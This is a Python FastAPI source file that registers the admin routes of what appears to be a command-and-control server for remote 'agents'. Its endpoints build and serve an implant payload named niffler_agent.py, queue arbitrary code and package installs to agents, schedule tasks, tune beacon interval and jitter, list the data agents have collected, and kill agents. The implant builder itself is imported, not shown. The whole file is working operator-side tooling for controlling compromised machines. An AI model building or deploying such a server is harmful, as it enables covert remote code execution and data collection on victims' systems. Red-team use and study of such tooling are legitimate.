from pathlib import Path

from fastapi import Depends, HTTPException
from fastapi.responses import FileResponse

from backend.controllers.agent_controller import AgentController
from backend.dependencies import get_agent_controller, require_api_key
from backend.schemas.requests import DeployPackageRequest, QueueAgentTaskRequest, ReconfigureRequest, ScheduledTaskRequest
from backend.schemas.responses import AgentDetailResponse, AgentListResponse, ConfigUpdatedResponse, TaskQueuedResponse
from backend.services.implant_service import build_implant_payload


def register_admin_routes(app, base_dir: Path):
    @app.post("/admin/deploy_package", dependencies=[Depends(require_api_key)])
    def deploy_package(payload: DeployPackageRequest, controller: AgentController = Depends(get_agent_controller)):
        bootstrap_code = f"""
class Module:
    def run(self):
        return "__VENV_INSTALL__:{payload.package_name}"
"""
        result = controller.queue_task(payload.agent_id, f"install_{payload.package_name}", bootstrap_code, "Immediate", "0", 0)
        return {"status": "Package installation queued via database adapter.", **result}

    @app.post("/admin/task_scheduled", dependencies=[Depends(require_api_key)])
    def deploy_scheduled_task(payload: ScheduledTaskRequest, controller: AgentController = Depends(get_agent_controller)):
        return controller.queue_task(payload.agent_id, payload.module_name, payload.code, payload.sched_type, payload.sched_val, payload.duration_sec)

    @app.get("/admin/install", dependencies=[Depends(require_api_key)])
    def install_payload():
        output_path = build_implant_payload(base_dir / "dist" / "niffler_agent.py")
        return FileResponse(output_path, media_type="text/x-python", filename="niffler_agent.py")

    @app.post("/admin/reconfigure", dependencies=[Depends(require_api_key)])
    def update_config(payload: ReconfigureRequest, controller: AgentController = Depends(get_agent_controller)):
        return controller.update_config(payload.agent_id, payload.jitter, payload.beacon_interval)

    @app.get("/admin/agents", response_model=AgentListResponse, dependencies=[Depends(require_api_key)])
    def list_agents(controller: AgentController = Depends(get_agent_controller)):
        return {"agents": controller.list_agents()}

    @app.get("/admin/agents/{agent_id}", response_model=AgentDetailResponse, dependencies=[Depends(require_api_key)])
    def get_agent(agent_id: str, controller: AgentController = Depends(get_agent_controller)):
        agent, tasks, workflows, data = controller.get_agent(agent_id)
        if not agent:
            raise HTTPException(status_code=404, detail="Agent not found")
        return {"agent": agent, "tasks": tasks, "workflows": workflows, "data": data}

    @app.post("/admin/agents/{agent_id}/task", response_model=TaskQueuedResponse, dependencies=[Depends(require_api_key)])
    def queue_agent_task(agent_id: str, payload: QueueAgentTaskRequest, controller: AgentController = Depends(get_agent_controller)):
        return controller.queue_task(agent_id, payload.module_name, payload.code, payload.sched_type, payload.sched_val, payload.duration_sec)

    @app.post("/admin/agents/{agent_id}/kill", dependencies=[Depends(require_api_key)])
    def kill_agent(agent_id: str, controller: AgentController = Depends(get_agent_controller)):
        return controller.kill_agent(agent_id)
